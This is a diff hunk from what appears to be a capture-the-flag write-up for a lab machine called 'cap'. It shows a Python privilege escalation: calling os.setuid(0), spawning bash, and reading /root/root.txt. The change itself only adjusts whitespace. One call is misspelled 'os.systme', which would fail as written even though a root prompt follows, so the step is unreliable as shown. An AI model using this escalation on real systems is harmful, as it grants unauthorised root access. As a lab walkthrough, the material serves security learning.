@@ -5,10 +5,10 @@
 So by using os module in python to do root privileges in target
 
 nathan@cap:~$ python3.8
->> import os
->> os.system('whoami')
->> os.system('id')
->> os.setuid(0)
->> os.systme('bash')
+>>  import os
+>>  os.system('whoami')
+>>  os.system('id')
+>>  os.setuid(0)
+>>  os.systme('bash')
 
 root@cap: cat /root/root.txt
